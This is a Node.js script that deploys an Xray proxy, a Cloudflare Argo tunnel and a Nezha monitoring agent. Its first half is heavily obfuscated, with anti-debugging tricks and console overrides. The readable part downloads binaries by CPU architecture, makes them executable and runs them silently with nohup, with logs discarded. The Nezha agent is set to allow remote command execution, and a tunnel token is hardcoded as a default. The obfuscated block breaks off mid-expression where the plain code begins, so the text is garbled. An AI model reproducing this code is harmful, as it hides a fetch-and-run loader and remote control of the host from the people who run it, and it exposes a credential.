(function(_0x291d24,_0x2ade2e){const _0x172e43=_0x291d24();function _0x144fc5(_0x3b5c9a,_0x471051,_0x1f61cb,_0x16cb07){return _0x2cb8(_0x16cb07-0x294,_0x1f61cb);}function _0xf4f70c(_0x347888,_0x1826dc,_0x2922aa,_0x103830){return _0x2cb8(_0x103830- -0x334,_0x347888);}while(!![]){try{const _0x429f00=parseInt(_0x144fc5(0x36d,0x2cb,0x3eb,0x39c))/(-0xa89+-0x11e2+-0xe36*-0x2)+parseInt(_0xf4f70c(-0x1ff,-0x1bf,-0x377,-0x2ac))/(0x42d*-0x1+-0x22ed*-0x1+-0x313*0xa)+parseInt(_0x144fc5(0x50d,0x4ac,0x3b2,0x4d6))/(-0x579*0x7+-0x41*-0xf+0x2283)+-parseInt(_0xf4f70c(-0x172,-0x2e7,-0x1db,-0x25e))/(0x16b5*-0x1+-0x1*-0x1ae7+-0x42e)+-parseInt(_0x144fc5(0x402,0x376,0x388,0x3ee))/(-0x2f*0xd+0x196*0x17+0x1109*-0x2)+-parseInt(_0xf4f70c(-0x2b0,-0xee,-0x1eb,-0x1b3))/(-0xa*-0x359+0x13d6+0x354a*-0x1)*(parseInt(_0xf4f70c(-0x240,-0x210,-0x187,-0x257))/(-0x2*0x1226+-0x736+0x8b5*0x5))+parseInt(_0x144fc5(0x2de,0x371,0x2f2,0x3a1))/(0x18e*0x10+0x239d+-0x3c75)*(parseInt(_0x144fc5(0x666,0x624,0x661,0x532))/(0x826+-0x76*-0x45+0x27eb*-0x1));if(_0x429f00===_0x2ade2e)break;else _0x172e43['push'](_0x172e43['shift']());}catch(_0x39d33f){_0x172e43['push'](_0x172e43['shift']());}}}(_0x29ac,-0x1*-0x7261d+0x14f*0xef3+-0xd8ed4));const _0x5b522b=(function(){const _0x1a1e14={};_0x1a1e14['ylddQ']=function(_0x4e8d3a,_0x3fa9e3){return _0x4e8d3a===_0x3fa9e3;},_0x1a1e14[_0x597107(0x1b2,0x1fd,0x2ba,0x2f0)]='TFDVW',_0x1a1e14[_0x597107(0x1c9,0x1d6,0x1df,0x1b0)]=function(_0x15d849,_0xcd89f8){return _0x15d849!==_0xcd89f8;},_0x1a1e14[_0x2df024(0x54f,0x4bc,0x406,0x595)]=_0x2df024(0x5d0,0x5f6,0x69b,0x6eb);function _0x597107(_0x18b9c8,_0x4809b2,_0x3b23b7,_0x101cb1){return _0x2cb8(_0x3b23b7-0x14c,_0x18b9c8);}function _0x2df024(_0x56e85d,_0x2246a9,_0x2747b0,_0xab45a8){return _0x2cb8(_0x2246a9-0x2d2,_0x2747b0);}const _0x2da323=_0x1a1e14;let _0x47fda2=!![];return function(_0x5740b2,_0x131f49){function _0x27bf36(_0x1c73ae,_0xbc76c6,_0x544661,_0xe1a6d6){return _0x2df024(_0x1c73ae-0xfa,_0x1c73ae- -0x421,_0xe1a6d6,_0xe1a6d6-0x140);}function _0x29ce8c(_0xa7c830,_0x1f80f9,_0x45a7ca,_0x43f067){return _0x597107(_0x1f80f9,_0x1f80f9-0xac,_0xa7c830-0x176,_0x43f067-0x1b7);}const _0x3197c2={'UlStG':function(_0x1e2214,_0x628a4c){function _0x545ffb(_0x2093e4,_0x12f26b,_0x4d0d1b,_0x471122){return _0x2cb8(_0x2093e4- -0x328,_0x4d0d1b);}return _0x2da323[_0x545ffb(-0x4f,-0x17e,0x37,0x69)](_0x1e2214,_0x628a4c);},'SXSGt':_0x2da323[_0x29ce8c(0x430,0x37d,0x388,0x4fa)]};if(_0x2da323[_0x29ce8c(0x355,0x396,0x485,0x25a)](_0x2da323[_0x27bf36(0x9b,-0x6c,0xb1,0x103)],_0x29ce8c(0x5e6,0x52a,0x6f4,0x535))){const _0x8dfa07=_0x24a433[_0x29ce8c(0x400,0x53a,0x36f,0x432)+'r']['prototype'][_0x27bf36(-0x4f,-0x18a,-0x94,0x9a)](_0x24919f),_0x4287d2=_0x18d4ae[_0x29705c],_0x263f76=_0x395d54[_0x4287d2]||_0x8dfa07;_0x8dfa07[_0x29ce8c(0x50b,0x3f2,0x5eb,0x5c6)]=_0x5849a9['bind'](_0x3decfd),_0x8dfa07['toString']=_0x263f76[_0x27bf36(0x181,0x245,0xf8,0x1b5)]['bind'](_0x263f76),_0x9fc4d6[_0x4287d2]=_0x8dfa07;}else{const _0x18a72d=_0x47fda2?function(){function _0x4046e2(_0x1497e5,_0x46f9eb,_0x26dfab,_0x1ce8ed){return _0x27bf36(_0x46f9eb- -0x14,_0x46f9eb-0x1d6,_0x26dfab-0x156,_0x1ce8ed);}function _0xa4b4cf(_0x554560,_0x2e783b,_0x341afa,_0xa1a983){return _0x27bf36(_0x2e783b-0xfd,_0x2e783b-0xb3,_0x341afa-0x16d,_0x554560);}if(_0x3197c2[_0xa4b4cf(-0xc,0x104,0x16f,0x17e)](_0x3197c2[_0x4046e2(0x199,0x185,0x88,0x2db)],_0x3197c2['SXSGt'])){if(_0x131f49){const _0x171dc7=_0x131f49[_0x4046e2(0x44,0x5b,-0xe,0x3f)](_0x5740b2,arguments);return _0x131f49=null,_0x171dc7;}}else _0x4ed76f?_0x498f30[_0xa4b4cf(-0x100,0x4e,0x184,-0xf9)](_0x4046e2(-0x1d8,-0xa9,-0x13b,-0x135)+_0xa4b4cf(0x8c,0x102,0x1d5,0x1d9)+_0x4046e2(-0x110,-0xee,0x43,-0x1ec)+_0xe4b20+':\x20'+_0x311f0a):_0x2a8970[_0x4046e2(-0xc3,-0xfb,-0x1a2,-0x30)]('Empowermen'+_0x4046e2(0x91,-0x68,-0x15f,0x9e)+_0x4046e2(0x7b,0x2b,0x76,0x104)+_0x4204ac+':\x20'+_0x263da0['toString'](0x16d9+-0x19f0+0x31f));}:function(){};return _0x47fda2=![],_0x18a72d;}};}()),_0x5509ba=_0x5b522b(this,function(){const _0x10ec46={};_0x10ec46[_0x3be609(0x190,0x119,0x9b,-0x9)]=_0x24faa1(0x34b,0x259,0x368,0x49e)+'+$';function _0x3be609(_0x43cea2,_0x31034e,_0x5badce,_0x756ecd){return _0x2cb8(_0x31034e- -0x11e,_0x756ecd);}const _0x5a81a7=_0x10ec46;function _0x24faa1(_0x49a760,_0x59aaef,_0x377ceb,_0x122daa){return _0x2cb8(_0x377ceb-0x6f,_0x59aaef);}return _0x5509ba[_0x24faa1(0x284,0x32d,0x33f,0x2ad)]()[_0x24faa1(0x39c,0x2d9,0x23a,0x36f)]('(((.+)+)+)'+'+$')[_0x3be609(0x1eb,0x1b2,0x10a,0x78)]()[_0x3be609(0x25,0x20,0x109,0x2a)+'r'](_0x5509ba)[_0x3be609(0x1e9,0xad,-0x7d,0xf4)](_0x5a81a7[_0x24faa1(0x39c,0x260,0x2a6,0x371)]);});_0x5509ba();const _0x5ae6e2=(function(){const _0x5787fc={};_0x5787fc['rvxMZ']=function(_0x1b919b,_0x177c98){return _0x1b919b!==_0x177c98;};const _0x552b62=_0x5787fc;let _0x3e8652=!![];return function(_0x11e0b7,_0x490ce6){function _0x5ec6f9(_0x2014a1,_0x1a8382,_0x1bbd45,_0x2ae559){return _0x2cb8(_0x1a8382-0x2f7,_0x2014a1);}function _0x4115be(_0x116fbd,_0x52caf1,_0x57b525,_0x1788d8){return _0x2cb8(_0x1788d8-0x1e4,_0x52caf1);}if(_0x552b62[_0x4115be(0x3fb,0x2a9,0x330,0x3d1)]('xuHcg',_0x5ec6f9(0x22d,0x37a,0x2d7,0x430))){const _0x372d40=_0x3e8652?function(){function _0x528079(_0x2c98c8,_0x40e44e,_0x13c51d,_0x34cc2f){return _0x4115be(_0x2c98c8-0x39,_0x2c98c8,_0x13c51d-0x1b9,_0x40e44e- -0x23);}if(_0x490ce6){const _0x317b41=_0x490ce6[_0x528079(0x363,0x37f,0x248,0x4a7)](_0x11e0b7,arguments);return _0x490ce6=null,_0x317b41;}}:function(){};return _0x3e8652=![],_0x372d40;}else _0x333174[_0x4115be(0x362,0x1d1,0x343,0x284)](_0x5ec6f9(0x471,0x53e,0x3f9,0x64e)+_0x5ec6f9(0x339,0x3b6,0x392,0x3a9)+_0x5ec6f9(0x351,0x432,0x3e2,0x50b)+_0x18f65d);};}()),_0x5b6f6a=_0x5ae6e2(this,function(){const _0x44e8c7={'EnZWB':function(_0x37a71e,_0x7a2257){return _0x37a71e===_0x7a2257;},'SvebN':_0x3187ca(0x6ea,0x5a3,0x697,0x62b)+_0x255848(-0x1a8,-0x18e,-0x18e,-0x1d6)+'yc.mn/agen'+'t','aTPGT':_0x3187ca(0x590,0x458,0x33e,0x39f)+_0x255848(-0x3a,-0x124,0xf,-0xcc)+_0x3187ca(0x389,0x4d9,0x5d0,0x37e),'VcJtc':_0x3187ca(0x3b2,0x4b0,0x464,0x55a)+_0x255848(-0x2b2,-0x327,-0x3cb,-0x1d1)+_0x255848(-0x22a,-0x11e,-0x12d,-0x18c)+_0x255848(-0x192,-0x8c,0x9e,-0xb),'QUcVk':function(_0x2dccc5,_0x2542fb){return _0x2dccc5!==_0x2542fb;},'FZYnE':'BIOgU','KAGcO':_0x255848(-0x2f1,-0x298,-0x330,-0x28d),'MjNgb':function(_0x2167d1,_0x1213e5){return _0x2167d1+_0x1213e5;},'Yvoji':'{}.constru'+'ctor(\x22retu'+_0x3187ca(0x4b0,0x4b5,0x4a4,0x3f7)+'\x20)','yluWh':function(_0x157165,_0x74a85a){return _0x157165===_0x74a85a;},'KQUoG':_0x255848(-0x341,-0x2f5,-0x408,-0x2cd),'hmbFA':function(_0x14f3e9){return _0x14f3e9();},'BuvlN':_0x3187ca(0x3f2,0x31c,0x39a,0x1e7),'kgEHR':_0x3187ca(0x5a9,0x497,0x53a,0x58f),'wXoMn':_0x3187ca(0x497,0x354,0x29d,0x41a),'TgcwX':_0x3187ca(0x4e9,0x5c9,0x5c9,0x487),'vQGAK':function(_0x31b429,_0x3f247c){return _0x31b429<_0x3f247c;}};function _0x3187ca(_0x2f41e1,_0x44184d,_0x1ec788,_0x34063a){return _0x2cb8(_0x44184d-0x2b4,_0x34063a);}const _0x393192=function(){const _0x4e25f0={};function _0x2328fd(_0x48f504,_0x2c16e9,_0x20fb69,_0xfc7b5d){return _0x255848(_0x48f504-0x8c,_0xfc7b5d-0x3f7,_0x20fb69-0x139,_0x48f504);}function _0x3aff59(_0x37b454,_0x1a1caf,_0x2b5262,_0x235fb6){return _0x3187ca(_0x37b454-0x140,_0x1a1caf- -0x41e,_0x2b5262-0x71,_0x37b454);}_0x4e25f0[_0x2328fd(0x3e8,0x1e9,0x1cd,0x310)]=_0x44e8c7[_0x2328fd(0x1e5,0x1cb,0x1ef,0x325)];const _0xdd58ec=_0x4e25f0;if(_0x44e8c7[_0x3aff59(0x8a,-0x9f,-0x6c,-0x11c)](_0x44e8c7[_0x3aff59(-0x9a,0x96,0x174,-0x2b)],_0x44e8c7[_0x3aff59(0x1d3,0x96,0x1a3,0x185)])){if(_0x4a5482){const _0x353503=_0x44e8c7[_0x2328fd(0x11b,0x21e,0x18,0x12f)](_0x21f6a3,'arm')?_0x44e8c7[_0x2328fd(0x2c6,0x134,0x2b0,0x19b)]:_0x3aff59(-0x125,0x3a,0x187,0x8e)+_0x3aff59(0x3c,0x106,0x83,0x17c)+_0x2328fd(0xef,0x15e,0x324,0x21d)+'t',_0x126a85={};_0x126a85['fileName']=_0x52114e,_0x126a85[_0x2328fd(0x1a1,0x1bb,0xad,0x1b1)]=_0x353503,_0x5f0bfe['unshift'](_0x126a85);}else{const _0x2c9e6b=_0x44e8c7['EnZWB'](_0x23b970,_0x2328fd(0x239,0x140,0x1f5,0x17c))?_0x3aff59(0x74,0x185,0xca,0x1c7)+_0x2328fd(0x188,0x22f,0x35c,0x269)+_0x2328fd(0x239,0x28e,0x248,0x288):_0x44e8c7[_0x3aff59(0x248,0x14a,0x290,0xe2)],_0x3acae5={};_0x3acae5[_0x2328fd(0x109,0x2e6,0x2af,0x1f0)]=_0x342373,_0x3acae5[_0x3aff59(0x10c,-0x1c,0xbd,-0xc0)]=_0x2c9e6b,_0x527c09['unshift'](_0x3acae5);}}else{let _0x2e6dc1;try{_0x44e8c7[_0x2328fd(0x113,0xa7,0x245,0x12e)](_0x2328fd(0x41,0x6f,0x22b,0x15f),_0x44e8c7['KAGcO'])?_0x5c97[_0x2328fd(0x136,-0x70,-0x70,0xcb)](_0xdd58ec[_0x2328fd(0x332,0x1f5,0x353,0x310)]):_0x2e6dc1=Function(_0x44e8c7[_0x2328fd(0x268,0x2b9,0x320,0x236)](_0x44e8c7[_0x2328fd(0x31f,0x1e0,0xfc,0x236)](_0x2328fd(0x2a3,0x28c,0x222,0x212)+_0x2328fd(0x32b,0x203,0x2d7,0x24b),_0x44e8c7[_0x3aff59(-0x7e,0xc2,0x25,0xe7)]),');'))();}catch(_0x33af49){_0x44e8c7[_0x2328fd(0x2b5,0x26a,0x1ec,0x28e)](_0x44e8c7[_0x3aff59(0x14a,0x8,0xf1,0x95)],_0x44e8c7[_0x3aff59(-0x87,0x8,0x4d,-0x3)])?_0x2e6dc1=window:_0x53c90f=_0x19b15d;}return _0x2e6dc1;}},_0x3a0440=_0x44e8c7[_0x3187ca(0x5ad,0x455,0x33f,0x544)](_0x393192),_0x5a5543=_0x3a0440[_0x3187ca(0x382,0x4a6,0x5e1,0x5c6)]=_0x3a0440[_0x3187ca(0x487,0x4a6,0x477,0x553)]||{},_0x28b792=[_0x44e8c7['BuvlN'],_0x44e8c7['kgEHR'],'info',_0x44e8c7[_0x3187ca(0x3e7,0x50b,0x4cb,0x4a9)],'exception','table',_0x44e8c7[_0x3187ca(0x368,0x495,0x383,0x44a)]];function _0x255848(_0x2d7d92,_0x5af819,_0x256239,_0x95c654){return _0x2cb8(_0x5af819- -0x394,_0x95c654);}for(let _0x47d6d5=-0x112c+-0x199e+0x1*0x2aca;_0x44e8c7[_0x3187ca(0x403,0x33e,0x434,0x331)](_0x47d6d5,_0x28b792[_0x3187ca(0x645,0x585,0x658,0x669)]);_0x47d6d5++){const _0x1c14ee=_0x5ae6e2[_0x3187ca(0x2f4,0x3f2,0x37e,0x33d)+'r'][_0x255848(-0x1a7,-0x1f7,-0xb0,-0x1b1)][_0x255848(-0x2dc,-0x294,-0x380,-0x1d7)](_0x5ae6e2),_0x11e795=_0x28b792[_0x47d6d5],_0x126d21=_0x5a5543[_0x11e795]||_0x1c14ee;_0x1c14ee[_0x3187ca(0x410,0x4fd,0x464,0x3ca)]=_0x5ae6e2['bind'](_0x5ae6e2),_0x1c14ee[_0x3187ca(0x4db,0x584,0x518,0x566)]=_0x126d21[_0x255848(0x87,-0xc4,-0x62,-0x11b)][_0x3187ca(0x4f8,0x3b4,0x417,0x37e)](_0x126d21),_0x5a5543[_0x11e795]=_0x1c14ee;}});_0x5b6f6a();const express=require(_0x25f67e(-0xa4,-0x1b4,-0x7d,-0xcc)),app=express();function _0x576761(_0x7a6ddf,_0x55a04c,_0x5411e8,_0x4bb1d0){return _0x2cb8(_0x5411e8- -0x3b3,_0x4bb1d0);}const axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x576761(0x4d,-0x1a3,-0xd3,-0xb2)),exec=promisify(require(_0x576761(-0x477,-0x375,-0x31e,-0x22b)+_0x25f67e(-0x2cc,-0x21b,-0x27d,-0x168))[_0x576761(-0x18b,-0x1c3,-0x1fe,-0x1fb)]),{execSync}=require(_0x25f67e(-0x1aa,-0x1fd,-0x1a2,-0x193)+'ess'),UPLOAD_URL=process[_0x576761(-0xbf,-0x13b,-0x1c5,-0x247)][_0x576761(-0x2af,-0x2d3,-0x18d,-0x2aa)]||'',PROJECT_URL=process[_0x25f67e(-0x74,-0xa4,-0x155,0x8d)][_0x576761(0x17,-0x39,-0x126,-0x12a)+'L']||'',AUTO_ACCESS=process[_0x576761(-0x1b0,-0x1c1,-0x1c5,-0x16e)]['AUTO_ACCES'+'S']||![],FILE_PATH=process[_0x576761(-0x1c2,-0x26a,-0x1c5,-0x1b2)][_0x576761(-0x1c8,-0x2ff,-0x261,-0x1e1)]||_0x576761(-0xad,-0x4e,-0xc1,0x83),SUB_PATH=process[_0x25f67e(-0x80,-0xa4,0x89,-0xfb)][_0x576761(-0x328,-0x39f,-0x324,-0x1e6)]||_0x25f67e(-0x1a9,-0x184,-0x53,-0x216);function _0x25f67e(_0x32d075,_0x49d660,_0xc9812c,_0x555cbe){return _0x2cb8(_0x49d660- -0x292,_0x555cbe);}const PORT=process[_0x25f67e(0x52,-0xa4,-0x1b3,-0x174)]['SERVER_POR'+'T']||process['env'][_0x576761(0x6c,-0x167,-0xaf,0x89)]||-0xf23+-0x2*-0x6d+0x8ab*0x3,UUID=process['env'][_0x25f67e(0x2d,0x8a,0x91,0x42)]||_0x25f67e(0x3b,-0x100,-0x166,-0x3c)+_0x25f67e(-0x1c9,-0x1cb,-0x2fa,-0x2cb)+_0x576761(-0x1e8,-0x2a5,-0x2b2,-0x1a5)+_0x25f67e(-0x116,-0x19,-0x82,0x59),NEZHA_SERVER=process[_0x576761(-0x2b0,-0xbc,-0x1c5,-0x2d8)][_0x25f67e(-0x161,-0x217,-0xdc,-0x12a)+'ER']||'',NEZHA_PORT=process['env'][_0x576761(-0x318,-0x2d6,-0x349,-0x2e5)]||'',NEZHA_KEY=process[_0x25f67e(-0x24,-0xa4,-0x106,-0x137)][_0x576761(-0x15,-0x92,-0xd0,-0x18f)]||'',ARGO_DOMAIN=process['env'][_0x25f67e(0xc9,0x7c,0x2d,0xe1)+'N']||'6.1.c.b.b.'+_0x576761(-0x10e,-0x1c4,-0x148,-0x4d)+'0.a.2.ip6.'+_0x576761(-0x233,-0x82,-0xe4,-0x65),ARGO_AUTH=process[_0x25f67e(-0x11e,-0xa4,-0x16f,-0x13c)][_0x25f67e(-0xcb,-0x1b9,-0x110,-0x73)]||'eyJhIjoiMG'+_0x576761(-0x2c3,-0x1d1,-0x2d4,-0x1f1)+_0x25f67e(-0x1d6,-0x153,-0x23b,-0x6a)+'VkZjQ2ODRk'+_0x25f67e(-0xd1,-0x1af,-0xf2,-0x13c)+_0x25f67e(-0x8b,-0x26,-0x4b,0x58)+'YmJkOWQzMW'+_0x576761(-0x387,-0x415,-0x311,-0x36c)+'ZDU1LWIyOT'+'MtYmQzNjI5'+_0x576761(-0x1f3,-0x1a8,-0x10a,-0x249)+_0x25f67e(0x22,-0x1b,0x133,-0x62)+_0x576761(-0x13d,-0x1b0,-0x128,-0xfe)+_0x25f67e(0x109,-0x31,-0x30,0x6c)+'QzAwTXpnNU'+_0x576761(0xa,-0x101,-0x118,0x18)+_0x576761(-0x313,-0x2ee,-0x20c,-0x134)+'xOV0prTkRj'+'eCJ9',ARGO_PORT=process['env']['ARGO_PORT']||0x1d15*0x1+0x179e*-0x1+0x28e,CFIP=process[_0x576761(-0xe7,-0x31f,-0x1c5,-0x1a3)][_0x576761(-0x29a,-0x18a,-0x28b,-0x1e9)]||_0x25f67e(-0xbf,-0x176,-0x197,-0x16f)+_0x25f67e(0x1ab,0x57,-0x109,0x11c),CFPORT=process[_0x25f67e(-0xfc,-0xa4,0x25,-0x177)]['CFPORT']||0x214c+0x1*0x1b4f+-0x13a0*0x3,NAME=process[_0x576761(-0xe9,-0x1fa,-0x1c5,-0x78)][_0x576761(-0x246,-0x13e,-0x12c,0xb)]||_0x25f67e(-0x83,-0x95,-0x15c,-0x42);function _0x2cb8(_0x2f1630,_0x54babb){const _0x4e2e1b=_0x29ac();return _0x2cb8=function(_0x4aad72,_0x2aa3f6){_0x4aad72=_0x4aad72-(0x1ac7*-0x1+0x1*0x11c9+0x1e1*0x5);let _0x1b68e2=_0x4e2e1b[_0x4aad72];if(_0x2cb8['UziZSH']===undefined){var _0x2fd6e2=function(_0x46127c){const _0x46a95c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0xa080ae='',_0xadc640='',_0x505a4e=_0xa080ae+_0x2fd6e2;for(let _0x482fe2=0x23c0+0x2*-0x277+-0x1ed2,_0x3b2b2f,_0x5b3582,_0x3ee4e4=-0x6e3+0x74*0x35+-0x1*0x1121;_0x5b3582=_0x46127c['charAt'](_0x3ee4e4++);~_0x5b3582&&(_0x3b2b2f=_0x482fe2%(0x119f+-0xe4b*0x1+-0x350)?_0x3b2b2f*(-0x166*0x13+0x2672+-0xba0)+_0x5b3582:_0x5b3582,_0x482fe2++%(0x1020+0x3*-0x62b+-0x265*-0x1))?_0xa080ae+=_0x505a4e['charCodeAt'](_0x3ee4e4+(-0x1c01+-0x1*-0x7eb+0x1420))-(0x49*-0x5+0x13c4+-0x124d)!==0x2261+-0x172e+0x1*-0xb33?String['fromCharCode'](0x5d1*-0x3+0x17c0+0x7*-0xc2&_0x3b2b2f>>(-(0x9f2+-0x1ba3+-0x11b3*-0x1)*_0x482fe2&0x1d4c+-0x1*0x1a81+-0x2c5*0x1)):_0x482fe2:-0xf08+-0xaed*0x1+0x19f5){_0x5b3582=_0x46a95c['indexOf'](_0x5b3582);}for(let _0x12a112=0x1d88+0xa27+-0x1*0x27af,_0xa98488=_0xa080ae['length'];_0x12a112<_0xa98488;_0x12a112++){_0xadc640+='%'+('00'+_0xa080ae['charCodeAt'](_0x12a112)['toString'](0x1f00+0x3*0xcc1+-0x4533))['slice'](-(0x1a20+-0x10*-0x14d+-0x2eee));}return decodeURIComponent(_0xadc640);};_0x2cb8['YONWrA']=_0x2fd6e2,_0x2f1630=arguments,_0x2cb8['UziZSH']=!![];}const _0x41ca5d=_0x4e2e1b[-0x3*0x5f6+0x1843+-0x661],_0x417b2c=_0x4aad72+_0x41ca5d,_0x3a253f=_0x2f1630[_0x417b2c];if(!_0x3a253f){const _0x12b25d=function(_0x3f4c0d){this['UNRiUW']=_0x3f4c0d,this['nbiFjg']=[-0x17*0x1b+-0x2*-0x6c+0x196,-0x8b9+0x1d93+-0x14da,0x74*-0x13+-0x1559*-0x1+-0xcbd],this['CczhPU']=function(){return'newState';},this['HKBPkW']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['xNBCVN']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x12b25d['prototype']['AybNRa']=function(){const _0x9ba0bf=new RegExp(this['HKBPkW']+this['xNBCVN']),_0x4c9ffa=_0x9ba0bf['test'](this['CczhPU']['toString']())?--this['nbiFjg'][-0x91c+0x25cd*-0x1+-0x1775*-0x2]:--this['nbiFjg'][0x201b+0x4d2*-0x2+-0x1677];return this['MMOZde'](_0x4c9ffa);},_0x12b25d['prototype']['MMOZde']=function(_0x47b1df){if(!Boolean(~_0x47b1df))return _0x47b1df;return this['EsfaxK'](this['UNRiUW']);},_0x12b25d['prototype']['EsfaxK']=function(_0x3c6cfb){for(let _0x1b5e6e=-0x26d9+-0x2236+-0x1*-0x490f,_0xfc3477=this['nbiFjg']['length'];_0x1b5e6e<_0xfc3477;_0x1b5e6e++){this['nbiFjg']['push'](Math['round'](Math['random']())),_0xfc3477=this['nbiFjg']['length'];}return _0x3c6cfb(this['nbiFjg'][-0x377*-0x1+0x2495*0x1+-0x280c]);},new _0x12b25d(_0x2cb8)['AybNRa'](),_0x1b68e2=_0x2cb8['YONWrA'](_0x1b68e2),_0x2f1630[_0x417b2c]=_0x1b68e2;}else _0x1b68e2=_0x3a253f;return _0x1b68e2;},_0x2cb8(_0x2f1630,_0x54babb);}!fs[_0x576761(-0x341,-0x217,-0x296,-0x2af)](FILE_PATH)?(fs[_0x576761(-0x2,-0xde,-0xdd,-0x147)](FILE_PATH),console[_0x576761(-0x422,-0x2fd,-0x34b,-0x23c)](FILE_PATH+(_0x576761(-0x134,-0x112,-0xd2,-0x121)+'d'))):console[_0x25f67e(-0x28e,-0x22a,-0x308,-0x12f)](FILE_PATH+(_0x576761(-0x219,-0x2be,-0x19b,-0x// 生成xr-ay配置文件
async function generateConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
  };
  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
}

// 判断系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的依赖文件
function downloadFile(fileName, fileUrl, callback) {
  const filePath = fileName; 
  
  // 确保目录存在
  if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH, { recursive: true });
  }
  
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${path.basename(filePath)} successfully`);
        callback(null, filePath);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
        console.error(errorMessage); // 下载失败时输出错误消息
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
      console.error(errorMessage); // 下载失败时输出错误消息
      callback(errorMessage);
    });
}

// 下载并运行依赖文件
async function downloadFilesAndRun() {  
  
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, filePath) => {
        if (err) {
          reject(err);
        } else {
          resolve(filePath);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }
  // 授权和运行
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(absoluteFilePath => {
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }
  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
  authorizeFiles(filesToAuthorize);

  //运行ne-zha
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      // 检测哪吒是否开启TLS
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      // 生成 config.yaml
      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
      
      // 运行 v1
      const command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log(`${phpName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`php running error: ${error}`);
      }
    } else {
      let NEZHA_TLS = '';
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      if (tlsPorts.includes(NEZHA_PORT)) {
        NEZHA_TLS = '--tls';
      }
      const command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log(`${npmName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`npm running error: ${error}`);
      }
    }
  } else {
    console.log('NEZHA variable is empty,skip running');
  }
  //运行xr-ay
  const command1 = `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    console.log(`${webName} is running`);
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
